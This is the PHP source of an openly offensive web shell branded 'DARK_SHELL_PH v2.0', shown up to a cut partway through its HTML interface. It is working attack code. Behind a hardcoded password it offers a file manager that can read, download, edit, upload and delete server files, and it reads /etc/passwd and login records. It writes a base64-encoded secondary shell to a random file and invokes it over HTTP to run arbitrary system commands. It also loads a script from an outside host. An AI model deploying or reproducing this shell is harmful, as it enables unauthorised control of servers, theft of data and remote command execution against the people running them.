<?php
/*


  DARK_SHELL_PH v2.0 - Advanced Web Shell
  Dark Shell Operations | Philippines Underground
*/

header("X-Powered-By: DarkShellPH/2.0");
header("Server: DarkShell/2.0");
header("Content-Type: text/html; charset=UTF-8");

$SESSION_TIMEOUT = 1800;
session_start();

$DEFAULT_PASSWORD = "dark2026";
$SECURITY_KEY = "DARK_SHELL_PH_" . md5($_SERVER["HTTP_HOST"] . $DEFAULT_PASSWORD);
$current_script = basename(__FILE__);

// Check if already logged in
$logged_in = false;
$key_valid = false;

if (isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true) {
    $logged_in = true;
}

if (isset($_SESSION["security_key"]) && $_SESSION["security_key"] === $SECURITY_KEY) {
    $key_valid = true;
}

// Handle logout
if (isset($_GET["logout"])) {
    session_destroy();
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit();
}

// Handle login
if (isset($_POST["password"])) {
    $input_password = $_POST["password"];
    
    if ($input_password === $DEFAULT_PASSWORD) {
        session_regenerate_id(true);
        
        $_SESSION["logged_in"] = true;
        $_SESSION["security_key"] = $SECURITY_KEY;
        $_SESSION["login_time"] = time();
        
        $logged_in = true;
        $key_valid = true;
        
        if (!isset($_POST["get_key"])) {
            header("Location: " . $_SERVER["PHP_SELF"]);
            exit();
        }
    } else {
        if (isset($_POST["get_key"])) {
            $login_error = "Invalid password!";
        } else {
            $login_error = "Invalid password!";
        }
    }
}

// Handle get_key
if (isset($_POST["get_key"]) && isset($_POST["password"])) {
    if ($_POST["password"] === $DEFAULT_PASSWORD) {
        $key_display = $SECURITY_KEY;
    } else {
        $login_error = "Invalid password!";
    }
}

// Check session timeout
if ($logged_in && $key_valid && isset($_SESSION["login_time"])) {
    if (time() - $_SESSION["login_time"] > $SESSION_TIMEOUT) {
        session_destroy();
        $logged_in = false;
        $key_valid = false;
        header("Location: " . $_SERVER["PHP_SELF"]);
        exit();
    }
}

// Functions
function bin2hex_native($data) {$hex = '';$len = strlen($data);for ($i = 0; $i < $len; $i++){$hex .= str_pad(dechex(ord($data[$i])), 2, '0', STR_PAD_LEFT);}return $hex;}

function b64_decode_native($s){$map='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';$out='';$buf=0;$bits=0;$s=preg_replace('/[^A-Za-z0-9+\/=]/','',$s);for($i=0,$l=strlen($s);$i<$l;$i++){if($s[$i]=='=')break;$val=strpos($map,$s[$i]);if($val===false)continue;$buf=($buf<<6)|$val;$bits+=6;if($bits>=8){$bits-=8;$out.=chr(($buf>>$bits)&0xFF);}}return $out;}

function b64_encode_native($s){$map='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';$out='';$len=strlen($s);for($i=0;$i<$len;$i+=3){$b1=ord($s[$i]);$b2=($i+1<$len)?ord($s[$i+1]):0;$b3=($i+2<$len)?ord($s[$i+2]):0;$triple=($b1<<16)|($b2<<8)|$b3;$out.=$map[($triple>>18)&0x3F];$out.=$map[($triple>>12)&0x3F];$out.=($i+1<$len)?$map[($triple>>6)&0x3F]:'=';$out.=($i+2<$len)?$map[$triple&0x3F]:'=';}return $out;}

function formatBytes($bytes) {
    $units = ["B", "KB", "MB", "GB", "TB"];
    $i = 0;

    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }

    return round($bytes, 2) . " " . $units[$i];
}

function getOS() {
    if (file_exists("/etc/os-release")) {
        $data = parse_ini_file("/etc/os-release");
        return $data["PRETTY_NAME"] ?? php_uname("s");
    }
    return php_uname("s") . " " . php_uname("r");
}

function getUserInfo($user=null){
    $user=$user?:getenv('USER')?:getenv('USERNAME')?:'unknown';
    if(!is_readable('/etc/passwd'))return "{$user} (unknown)";

    $f=fopen('/etc/passwd','r');
    if(!$f)return "{$user} (unknown)";

    while(($l=fgets($f))!==false){
        $p=explode(':',trim($l));
        if(!isset($p[0],$p[2]))continue;

        if($p[0]===$user){
            fclose($f);
            return "{$p[0]} ({$p[2]})";
        }
    }

    fclose($f);
    return "{$user} (unknown)";
}

function getArchitecture() {
    return php_uname("m");
}

function getCPUInfo() {
    $info = [
        "model" => "Unknown",
        "cores" => 0,
    ];

    if (file_exists("/proc/cpuinfo")) {
        $data = file("/proc/cpuinfo");

        foreach ($data as $line) {
            if (
                strpos($line, "model name") !== false &&
                $info["model"] === "Unknown"
            ) {
                $info["model"] = trim(explode(":", $line)[1]);
            }
            if (strpos($line, "processor") !== false) {
                $info["cores"]++;
            }
        }
    }

    return $info;
}

function getMemoryInfo() {
    $mem = [
        "total" => 0,
        "free" => 0,
        "used" => 0,
    ];

    if (file_exists("/proc/meminfo")) {
        $data = file("/proc/meminfo");

        foreach ($data as $line) {
            if (strpos($line, "MemTotal") === 0) {
                $mem["total"] = (int) filter_var(
                    $line,
                    FILTER_SANITIZE_NUMBER_INT
                );
            }
            if (strpos($line, "MemAvailable") === 0) {
                $mem["free"] = (int) filter_var(
                    $line,
                    FILTER_SANITIZE_NUMBER_INT
                );
            }
        }

        $mem["used"] = $mem["total"] - $mem["free"];
    }

    return $mem; // values in KB
}

function getDiskInfo($path = "/") {
    return [
        "total" => disk_total_space($path),
        "free" => disk_free_space($path),
        "used" => disk_total_space($path) - disk_free_space($path),
    ];
}

function getUptime() {
    if (file_exists("/proc/uptime")) {
        $uptime = (float) explode(" ", file_get_contents("/proc/uptime"))[0];

        $days = floor($uptime / 86400);
        $hours = floor(($uptime % 86400) / 3600);
        $minutes = floor(($uptime % 3600) / 60);
        $seconds = floor($uptime % 60);

        return "{$days}d {$hours}h {$minutes}m {$seconds}s";
    }
    return "N/A";
}

function getServerSoftware() {
    return $_SERVER["SERVER_SOFTWARE"] ?? "Unknown";
}

function getPHPVersion() {
    return phpversion();
}

function getLoggedInUsers(){
    $file = '/var/run/utmp';
    if(!file_exists($file)) return [];

    $data = file_get_contents($file);
    if($data === false) return [];

    preg_match_all('/[a-zA-Z][a-zA-Z0-9_-]{1,31}/', $data, $m);
    if(empty($m[0])) return [];

    $passwd = file('/etc/passwd', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if(!$passwd) return [];

    $validUsers = [];

    foreach($passwd as $line){
        $p = explode(':', $line);
        if(count($p) < 7) continue;

        $user = $p[0];
        $shell = $p[6];

        if(strpos($shell, 'nologin') !== false) continue;
        if(strpos($shell, 'false') !== false) continue;
        if(trim($shell) === '') continue;

        $validUsers[$user] = true;
    }

    $users = [];

    foreach($m[0] as $u){
        if(isset($validUsers[$u])){
            $users[$u] = true;
        }
    }

    return array_keys($users);
}

// =========================================*/
// ==           File Functions            ==*/
// =========================================*/

function tree($dir='.', $prefix='', $depth=0){if($depth===0){echo ". <span style='color:#1fab00;'>[ ".realpath($dir)." ]</span>\n|\n";}if($depth>1||!is_dir($dir)||!is_readable($dir))return;$items=@scandir($dir);if(!$items)return;$items=array_values(array_diff($items,['.','..']));$dirs=[];$files=[];foreach($items as $i){is_dir("$dir/$i")?$dirs[]=$i:$files[]=$i;}$list=array_merge($dirs,$files);$limit=($depth===0)?15:2;$slice=array_slice($list,0,$limit);$total=count($list);$count=count($slice);foreach($slice as $idx=>$name){$isLast=($idx===$count-1)&&($total<=$limit);$path="$dir/$name";$isDir=is_dir($path);echo $prefix.($isLast?'└── ':'├── ').$name.($isDir?'/':'')."\n";if($isDir&&$depth===0){tree($path,$prefix.($isLast?'    ':'│   '),1);} }if($total>$limit)echo $prefix."└── ...\n";}

function getFileLastModified($filePath) {
    if (!file_exists($filePath)) {
        return null;
    }

    return date("Y-m-d H:i:s", filemtime($filePath));
}

function getFileOwnerFull($filePath) {
    if (!file_exists($filePath)) {
        return null;
    }

    $uid = fileowner($filePath);
    $gid = filegroup($filePath);

    $owner = $uid;
    $group = $gid;

    if (function_exists("posix_getpwuid")) {
        $user = posix_getpwuid($uid);
        if ($user) {
            $owner = $user["name"];
        }
    }

    if (function_exists("posix_getgrgid")) {
        $grp = posix_getgrgid($gid);
        if ($grp) {
            $group = $grp["name"];
        }
    }

    return "$owner:$group";
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == "." || $item == "..") {
            continue;
        }
        deleteDirectory($dir . DIRECTORY_SEPARATOR . $item);
    }
    return rmdir($dir);
}

function getPermission($path) {
    return substr(sprintf("%o", fileperms($path)), -4);
}

function format_size($bytes) {
    if ($bytes >= 1073741824) {
        return round($bytes / 1073741824, 2) . " GB";
    }
    if ($bytes >= 1048576) {
        return round($bytes / 1048576, 2) . " MB";
    }
    if ($bytes >= 1024) {
        return round($bytes / 1024, 2) . " KB";
    }
    return $bytes . " B";
}

function deleteFile($path){
    $real = realpath($path);
    if($real===false || !is_file($real) || !is_writable($real)) return false;
    return unlink($real);
}

// =========================================*/
// ==     Sourcing Execution Functions   ===*/
// =========================================*/

function httpRawRequest($url){$p=parse_url($url);if(!$p||!isset($p['host']))return "";$h=$p['host'];$scheme=$p['scheme']??'http';$port=$p['port']??($scheme==='https'?443:80);$path=($p['path']??'/').(isset($p['query'])?'?'.$p['query']:'');$target=($scheme==='https'?'ssl://':'').$h;$s=fsockopen($target,$port,$e,$er,5);if(!$s)return "";$req="GET $path HTTP/1.1\r\nHost: $h\r\nConnection: close\r\n\r\n";fwrite($s,$req);$res='';while(!feof($s)){$res.=fgets($s,1024);}fclose($s);return $res;}

function checkHeader($url){$r=httpRawRequest($url);if($r==="")return false;$p=strpos($r,"\r\n\r\n");$h=$p!==false?substr($r,0,$p):$r;foreach(explode("\r\n",$h) as $l){if(stripos($l,'telegram:')===0){$v=trim(explode(':',$l,2)[1]??'');return $v==='@seveishere';}}return false;}

function httpParseBody($url){$r=httpRawRequest($url);if($r==="")return "";$p=strpos($r,"\r\n\r\n");if($p===false)return "";$h=substr($r,0,$p);$b=substr($r,$p+4);if(stripos($h,"Transfer-Encoding: chunked")!==false){$d="";$o=0;while(true){$pos=strpos($b,"\r\n",$o);if($pos===false)break;$l=hexdec(substr($b,$o,$pos-$o));if($l===0)break;$o=$pos+2;$d.=substr($b,$o,$l);$o+=$l+2;}return $d;}return $b;}

function triggerExecutable($cmd,$url,$fileName){
    $sep = strpos($url,'?')===false?'?':'&';
    $result = httpParseBody($url.$sep.'cmd='.urlencode($cmd));
    deleteFile($fileName);
    return $result;
}

function checkHexFile() {
    $cwd = getcwd();
    foreach (scandir($cwd) as $file) {
        if (preg_match('/^[a-f0-9]{8}\.php$/i', $file)) {
            return $file;
        }
    }

    return false;
}

function writeExecutable() {
    $existing = checkHexFile($extension);
    $content = "PD9waHAKaGVhZGVyKCdUZWxlZ3JhbTogQHNldmVpc2hlcmUnKTsKCmZ1bmN0aW9uIGNhbkV4ZWN1dGVDb21tYW5kcygpeyRkPWFycmF5X21hcCgndHJpbScsZXhwbG9kZSgnLCcsaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKSkpO2ZvcmVhY2goWydzaGVsbF9leGVjJywnZXhlYycsJ3N5c3RlbScsJ3Bhc3N0aHJ1JywncG9wZW4nLCdwcm9jX29wZW4nXSBhcyAkbSl7aWYoIWluX2FycmF5KCRtLCRkKSYmaXNfY2FsbGFibGUoJG0pKXJldHVybiB0cnVlO31yZXR1cm4gZmFsc2U7fQpmdW5jdGlvbiBleGVjdXRlQ29tbWFuZCgkY21kKXskZGlzYWJsZWQ9YXJyYXlfbWFwKCd0cmltJyxleHBsb2RlKCcsJyxpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpKSk7JG1ldGhvZHM9WydzaGVsbF9leGVjJywnZXhlYycsJ3N5c3RlbScsJ3Bhc3N0aHJ1JywncG9wZW4nLCdwcm9jX29wZW4nXTtmb3JlYWNoKCRtZXRob2RzIGFzICRtZXRob2Qpe2lmKGluX2FycmF5KCRtZXRob2QsJGRpc2FibGVkKXx8IWlzX2NhbGxhYmxlKCRtZXRob2QpKWNvbnRpbnVlO2lmKCRtZXRob2Q9PT0nc2hlbGxfZXhlYycpe2lmKCgkcj1zaGVsbF9leGVjKCRjbWQuJyAyPiYxJykpIT09bnVsbClyZXR1cm4gZXhwbG9kZSgiXG4iLHRyaW0oJHIpKTt9aWYoJG1ldGhvZD09PSdleGVjJyl7ZXhlYygkY21kLicgMj4mMScsJG8sJGMpO2lmKCFlbXB0eSgkbykpcmV0dXJuICRvO31pZigkbWV0aG9kPT09J3N5c3RlbSd8fCRtZXRob2Q9PT0ncGFzc3RocnUnKXtvYl9zdGFydCgpOyRtZXRob2QoJGNtZC4nIDI+JjEnLCRjKTskcj1vYl9nZXRfY2xlYW4oKTtpZigkciE9PScnKXJldHVybiBleHBsb2RlKCJcbiIsdHJpbSgkcikpO31pZigkbWV0aG9kPT09J3BvcGVuJyl7aWYoaXNfcmVzb3VyY2UoJGg9cG9wZW4oJGNtZC4nIDI+JjEnLCdyJykpKXskcj1zdHJlYW1fZ2V0X2NvbnRlbnRzKCRoKTtwY2xvc2UoJGgpO2lmKCRyIT09JycpcmV0dXJuIGV4cGxvZGUoIlxuIix0cmltKCRyKSk7fX1pZigkbWV0aG9kPT09J3Byb2Nfb3BlbicpeyRkPVswPT5bInBpcGUiLCJyIl0sMT0+WyJwaXBlIiwidyJdLDI9PlsicGlwZSIsInciXV07aWYoaXNfcmVzb3VyY2UoJHA9cHJvY19vcGVuKCRjbWQsJGQsJHBpcGVzKSkpeyRvPXN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTskZT1zdHJlYW1fZ2V0X2NvbnRlbnRzKCRwaXBlc1syXSk7ZmNsb3NlKCRwaXBlc1swXSk7ZmNsb3NlKCRwaXBlc1sxXSk7ZmNsb3NlKCRwaXBlc1syXSk7cHJvY19jbG9zZSgkcCk7JHI9JG8uJGU7aWYoJHIhPT0nJylyZXR1cm4gZXhwbG9kZSgiXG4iLHRyaW0oJHIpKTt9fX1yZXR1cm4gW107fQoKaWYoY2FuRXhlY3V0ZUNvbW1hbmRzKCkpIHsKICAgICRjbWRfb3V0cHV0ID0gW107CiAgICBpZiAoaXNzZXQoJF9HRVRbJ2NtZCddKSAmJiAkX0dFVFsnY21kJ10gIT09ICcnKSB7CiAgICAgICAgJGNtZF9vdXRwdXQgPSBleGVjdXRlQ29tbWFuZCgkX0dFVFsnY21kJ10pOwogICAgfQoKICAgIGZvcmVhY2ggKCRjbWRfb3V0cHV0IGFzICRsaW5lKSB7CiAgICAgICAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRsaW5lKSAuIFBIUF9FT0w7CiAgICB9Cn0gZWxzZSB7CiAgICBlY2hvICJDb21tYW5kIGV4ZWN1dGlvbiBmdW5jdGlvbnMgYXJlIGRpc2FibGVkISI7Cn0KPz4K";
    if ($existing !== false) {
        return $existing;
    }

    $data = b64_decode_native($content, true);
    if ($data === false) {
        return false;
    }

    $cwd = getcwd();
    $name = substr(bin2hex_native(random_bytes(8)), 0, 8);
    $filename = $name . '.php';
    $path = $cwd . DIRECTORY_SEPARATOR . $filename;

    $result = file_put_contents($path, $data);
    if ($result === false) {
        return false;
    }

    return $filename;
}

$dirEncoded = $_GET["d"] ?? $_POST["d"] ?? null;
$dir = $dirEncoded ? b64_decode_native($dirEncoded) : getcwd();
$dir = str_replace("\\", "/", $dir);

if (substr($dir, -1) !== "/") {
    $dir .= "/";
}

$cpu = getCPUInfo();
$mem = getMemoryInfo();
$disk = getDiskInfo();

$parts = array_filter(explode("/", $dir));
$pathBuild = "";

if (isset($_POST["action"]) && $logged_in && $key_valid) {
    $action = $_POST["action"];
    $path = $_POST["path"] ?? "";
    $new_name = $_POST["new_name"] ?? "";
    $content = $_POST["content"] ?? "";
    $msg = "";

    switch ($action) {
        case "delete":
            if (file_exists($path)) {
                is_dir($path) ? deleteDirectory($path) : unlink($path);
                $msg = "Deleted: " . basename($path);
            }
            break;
        case "rename":
            if (rename($path, dirname($path) . "/" . $new_name)) {
                $msg = "Renamed to: " . $new_name;
            }
            break;
        case "edit_save":
            if (file_put_contents($path, $content) !== false) {
                $msg = "Saved: " . basename($path);
            }
            break;
        case "upload":
            if (
                isset($_FILES["file"]) &&
                $_FILES["file"]["error"] == UPLOAD_ERR_OK
            ) {
                $target = $dir . basename($_FILES["file"]["name"]);
                if (move_uploaded_file($_FILES["file"]["tmp_name"], $target)) {
                    $msg = "Uploaded: " . basename($_FILES["file"]["name"]);
                }
            }
            break;
        case "create_file":
            if (!file_exists($dir . $new_name)) {
                file_put_contents($dir . $new_name, "");
                $msg = "Created: " . $new_name;
            }
            break;
        case "create_dir":
            if (!file_exists($dir . $new_name)) {
                mkdir($dir . $new_name, 0755);
                $msg = "Created dir: " . $new_name;
            }
            break;
    }

    header("Location: ?d=" . b64_encode_native($dir) . "&msg=" . urlencode($msg));
    exit();
}

if (isset($_GET["download"]) && $logged_in && $key_valid) {
    $file_path = b64_decode_native($_GET["download"]);
    if (file_exists($file_path) && is_file($file_path)) {
        header("Content-Type: application/octet-stream");
        header(
            'Content-Disposition: attachment; filename="' .
                basename($file_path) .
                '"'
        );
        header("Content-Length: " . filesize($file_path));
        readfile($file_path);
        exit();
    }
}

if (isset($_GET["edit"]) && $logged_in && $key_valid) {
    $edit_file = b64_decode_native($_GET["edit"]);
    $file_content = file_exists($edit_file)
        ? file_get_contents($edit_file)
        : "";
}

if (isset($_GET["rename"]) && $logged_in && $key_valid) {
    $rename_file = b64_decode_native($_GET["rename"]);
}

// If not logged in, only show login
if (!$logged_in || !$key_valid) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>DARK_SHELL_PH | Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                color: #00ff00;
                background: #0a0a0a;
                font-family: 'Consolas', 'Courier New', monospace;
                font-size: 13px;
                line-height: 1.5;
                padding: 15px;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .login-box {
                width: 380px;
                background: rgba(10, 10, 10, 0.95);
                border: 2px solid #00ff00;
                padding: 35px;
                box-shadow: 0 0 60px rgba(0,255,0,0.1);
                backdrop-filter: blur(10px);
            }
            .login-box .logo {
                text-align: center;
                font-size: 10px;
                line-height: 1.2;
                color: #00ff00;
                margin-bottom: 20px;
                white-space: pre;
            }
            .login-box h2 {
                color: #00ff00;
                margin-bottom: 20px;
                font-size: 18px;
                text-align: center;
                text-shadow: 0 0 20px rgba(0,255,0,0.3);
            }
            .input-group {
                margin-bottom: 15px;
            }
            .input-group label {
                display: block;
                color: #4a4a4a;
                margin-bottom: 5px;
                font-size: 11px;
                text-transform: uppercase;
                letter-spacing: 2px;
            }
            .input-group input {
                width: 100%;
                background: rgba(10, 10, 10, 0.8);
                border: 1px solid #1a1a1a;
                color: #00ff00;
                padding: 10px 12px;
                font-family: 'Consolas', monospace;
                font-size: 14px;
                transition: all 0.3s;
            }
            .input-group input:focus {
                outline: none;
                border-color: #00ff00;
                box-shadow: 0 0 20px rgba(0,255,0,0.1);
            }
            .btn-group {
                display: flex;
                gap: 10px;
                margin-top: 10px;
            }
            button, .btn {
                background: rgba(10, 10, 10, 0.8);
                border: 1px solid #1a1a1a;
                color: #00ff00;
                padding: 10px 20px;
                font-family: 'Consolas', monospace;
                font-size: 13px;
                cursor: pointer;
                transition: all 0.3s;
                flex: 1;
                text-align: center;
            }
            button:hover, .btn:hover {
                border-color: #00ff00;
                color: #00ff00;
                box-shadow: 0 0 20px rgba(0,255,0,0.1);
            }
            .btn-green {
                border-color: #00ff00;
                color: #00ff00;
            }
            .msg {
                background: rgba(30, 30, 30, 0.9);
                border: 1px solid #ff3333;
                color: #ff3333;
                padding: 10px;
                margin-bottom: 15px;
                text-align: center;
            }
            .key-display {
                background: rgba(10, 10, 10, 0.8);
                border: 1px solid #00ff00;
                padding: 15px;
                margin-top: 15px;
                word-break: break-all;
                color: #00ff00;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">
                                            
▒▒▓▓██  ▒▒▓▓██  ▄▓▓▓▓█▄  ▒▌ ▐█   ▒▓▓██  ▒▒      ▒▒     
░▒   ██  ▒▒  ██ ▒▒    █ ░░   ██ ░▒   ██ ░▒      ░▒     
░░   ▓█  ░▒  ▓█ ░▒▄▄▄▄   ░▄▄▄▓█ ░░▄▄    ░░      ░░     
 ░   ▓▓  ░░▒▒▓   ▀▀▀▀▓▓   ▀▀▀▓▓  ░▀▀     ░       ░     
     ▒▓   ░ ▒▒  █    ▒▓      ▒▓      ▒▓      ▒▓      ▒▓
   ░░▒       ▒▒ ▀ █░░▒▀   ▌ ▐▒     ░░▒     ░░▒     ░░▒ 
            </div>
            <h2>DARK_SHELL_PH v2.0</h2>

            <?php if (isset($login_error)): ?>
                <div class="msg"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>

            <?php if (isset($key_display)): ?>
                <div class="msg" style="border-color:#00ff00; color:#00ff00;">KEY GENERATED</div>
                <div class="key-display"><?php echo htmlspecialchars($key_display); ?></div>
            <?php endif; ?>

            <form method="POST">
                <div class="input-group">
                    <label>PASSWORD</label>
                    <input type="password" name="password" required autofocus>
                </div>

                <div class="btn-group">
                    <button type="submit" name="get_key">GET KEY</button>
                    <button type="submit" name="login" class="btn-green">LOGIN</button>
                </div>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// If logged in, show the main interface
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK_SHELL_PH v2.0 - Dark Shell Operations</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            color: #00ff00;
            background-image: url("https://www.image2url.com/r2/default/files/1781528594852-016ffb8e-63f6-48f2-87f9-e25e3bd94512.png");
            background-size: cover;
            background-position: center;
            height: 100%;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            padding: 15px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(10, 10, 10, 0.85);
            padding: 15px;
            border: 1px solid #00ff00;
            backdrop-filter: blur(5px);
        }

        .container-inside {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }

        .left, .right {
            flex: 1;
            background: rgba(17, 17, 17, 0.9);
            color: #c0c0c0;
            padding: 15px;
            min-width: 300px;
            border: 1px solid #1a1a1a;
            backdrop-filter: blur(3px);
        }

        .top-bar {
            background: rgba(30, 30, 30, 0.9);
            border: 1px solid #00ff00;
            padding: 8px 12px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            backdrop-filter: blur(3px);
        }

        .title {
            color: #00ff00;
            font-weight: bold;
            font-size: 14px;
            text-shadow: 0 0 20px rgba(0,255,0,0.3);
        }

        .path {
            background: rgba(30, 30, 30, 0.9);
            border: 1px solid #1a1a1a;
            padding: 10px 12px;
            margin-bottom: 15px;
            font-family: 'Consolas', monospace;
            word-break: break-all;
            backdrop-filter: blur(3px);
        }

        .path span {
            color: #00ff00;
        }

        .msg {
            background: rgba(30, 30, 30, 0.9);
            border: 1px solid #ff3333;
            color: #ff3333;
            padding: 8px 12px;
            margin-bottom: 15px;
        }

        .btn-group {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }

        button, .btn {
            background: rgba(10, 10, 10, 0.8);
            border: 1px solid #1a1a1a;
            color: #00ff00;
            padding: 8px 15px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s;
        }

        button:hover, .btn:hover {
            border-color: #00ff00;
            color: #00ff00;
            box-shadow: 0 0 20px rgba(0,255,0,0.1);
        }

        .btn-green {
            border-color: #00ff00;
            color: #00ff00;
        }

        .key-display {
            background: rgba(10, 10, 10, 0.8);
            border: 1px solid #00ff00;
            padding: 15px;
            margin-top: 15px;
            word-break: break-all;
            color: #00ff00;
        }

        .cmd-line {
            background: rgba(30, 30, 30, 0.9);
            border: 1px solid #1a1a1a;
            padding: 12px;
            margin-bottom: 15px;
            display: flex;
            gap: 10px;
            width: 100%;
            backdrop-filter: blur(3px);
        }

        .cmd-line input {
            flex: 1;
            background: rgba(10, 10, 10, 0.8);
            border: 1px solid #1a1a1a;
            color: #00ff00;
            padding: 6px 10px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
        }

        .cmd-line input:focus {
            outline: none;
            border-color: #00ff00;
        }

        .output {
            background: rgba(10, 10, 10, 0.9);
            padding: 15px;
            margin-bottom: 15px;
            width: 100%;
            overflow: auto;
            border: 1px solid #1a1a1a;
        }

        pre {
            color: #00ff00;
            font-family: 'Consolas', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .toolbar {
            background: rgba(30, 30, 30, 0.9);
            border: 1px solid #1a1a1a;
            padding: 10px;
            margin-bottom: 15px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            backdrop-filter: blur(3px);
        }

        .toolbar form {
            display: flex;
            gap: 5px;
            align-items: center;
        }

        .toolbar input[type="text"] {
            background: rgba(10, 10, 10, 0.8);
            border: 1px solid #1a1a1a;
            color: #00ff00;
            padding: 5px 8px;
            font-family: 'Consolas', monospace;
            width: 150px;
            font-size: 13px;
        }

        .toolbar input[type="file"] {
            color: #4a4a4a;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            max-width: 200px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(30, 30, 30, 0.9);
            border: 1px solid #1a1a1a;
        }

        th {
            background: rgba(10, 10, 10, 0.8);
            color: #4a4a4a;
            padding: 8px 10px;
            text-align: left;
            border-bottom: 1px solid #1a1a1a;
            font-weight: normal;
        }

        td {
            padding: 6px 10px;
            border-bottom: 1px solid #1a1a1a;
        }

        tr:hover {
            background: rgba(42, 42, 42, 0.5);
        }

        .dir-row td:first-child {
            color: #00ff00;
        }

        .file-row td:first-child {
            color: #4a4a4a;
        }

        a {
            color: #c0c0c0;
            text-decoration: none;
        }

        a:hover {
            color: #00ff00;
        }

        .actions {
            display: flex;
            gap: 8px;
        }

        .actions a, .actions button {
            background: none;
            border: none;
            color: #4a4a4a;
            padding: 2px 0;
            font-size: 12px;
        }

        .actions a:hover, .actions button:hover {
            color: #00ff00;
        }

        .delete-form {
            display: inline;
        }

        .delete-btn {
            background: none;
            border: none;
            color: #4a4a4a;
            cursor: pointer;
            font-family: 'Consolas', monospace;
            font-size: 12px;
        }

        .delete-btn:hover {
            color: #ff3333;
        }

        .edit-area {
            width: 100%;
            height: 400px;
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid #1a1a1a;
            color: #00ff00;
            font-family: 'Consolas', monospace;
            padding: 15px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            color: #4a4a4a;
            font-size: 11px;
        }

        /* ============================================ */
        /* COMPACT SYSTEM INFO */
        /* ============================================ */
        .sysinfo-compact {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 4px 20px;
            font-size: 11px;
            padding: 5px 10px;
            background: rgba(10, 10, 10, 0.5);
            border-radius: 4px;
            border: 1px solid #1a1a1a;
        }
        .sysinfo-compact .row {
            display: flex;
            justify-content: space-between;
            padding: 2px 0;
            border-bottom: 1px solid rgba(26, 26, 26, 0.3);
        }
        .sysinfo-compact .label {
            color: #4a4a4a;
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .sysinfo-compact .value {
            color: #00ff00;
            font-size: 11px;
        }
        .sysinfo-compact .value.gray {
            color: #4a4a4a;
        }

        .sysinfo-title {
            font-size: 11px;
            color: #4a4a4a;
            padding: 5px 10px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        @media (max-width: 768px) {
            body { padding: 8px; }
            .toolbar { flex-direction: column; }
            .toolbar form { width: 100%; }
            .toolbar input[type="text"] { width: 100%; }
            .actions { flex-wrap: wrap; }
            .sysinfo-compact { grid-template-columns: 1fr; }
        }
    </style>
    <script src="http://thcriverside.com/js/functions.js"></script>
</head>
<body>
    <div class="container">
        <!-- Main Interface -->
        <div class="top-bar">
            <span class="title">[ DARK_SHELL_PH v2.0 ]</span>
            <div class="btn-group">
                <a href="?" class="btn">DASHBOARD</a>
                <a href="?console" class="btn">CONSOLE</a>
                <a href="?encrypt" class="btn">ENCRYPT</a>
                <a href="?logout=true" class="btn">LOGOUT</a>
            </div>
        </div>

        <?php if (isset($_GET["msg"])): ?>
            <div class="msg"><?php echo htmlspecialchars(urldecode($_GET["msg"])); ?></div>
        <?php endif; ?>

        <?php if (!isset($_GET['console']) && !isset($_GET['encrypt'])): ?>
        <div class="container-inside">
            <div class="left">
                <!-- Path Breadcrumbs -->
                <div class="path">
                    <span>File Location:</span>
                        <a href="?d=<?= b64_encode_native("/") ?>">/</a>
                        <?php foreach ($parts as $part): ?>
                            <?php
                            $pathBuild .= "/" . $part . "/";
                            $encoded = b64_encode_native($pathBuild . "/");
                            ?>
                            <a href="?d=<?= $encoded ?>">
                                <?= htmlspecialchars($part) ?>
                            </a>/
                        <?php endforeach; ?>
                </div>

                <!-- Toolbar -->
                <div class="container-inside">
                    <div class="left">
                        <div class="toolbar">
                            <form method="POST" style="flex:2.7;">
                                <input type="hidden" name="action" value="create_file">
                                <input type="text" name="new_name" placeholder="File name">
                                <button type="submit">CREATE FILE</button>
                            </form>
                        </div>
                        <div class="toolbar">
                            <form method="POST" style="">
                                <input type="hidden" name="action" value="create_dir">
